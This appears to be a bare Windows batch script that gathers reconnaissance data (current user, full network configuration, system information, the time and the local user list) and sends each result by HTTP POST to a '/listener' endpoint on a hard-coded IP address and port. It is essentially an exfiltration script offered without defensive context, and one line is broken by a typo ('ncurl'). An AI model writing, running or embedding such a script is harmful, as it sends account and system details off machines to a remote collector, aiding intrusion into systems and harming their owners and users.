@echo off

set IP_ADDRESS=192.168.1.2
set PORT=80

whoami | curl -X POST -d @- http://%IP_ADDRESS%:%PORT%/listener

ipconfig /all | curl -X POST -d @- http://%IP_ADDRESS%:%PORT%/listener

systeminfo | ncurl -X POST -d @- http://%IP_ADDRESS%:%PORT%/listener

time /t | curl -X POST -d @- http://%IP_ADDRESS%:%PORT%/listener

net user | curl -X POST -d @- http://%IP_ADDRESS%:%PORT%/listener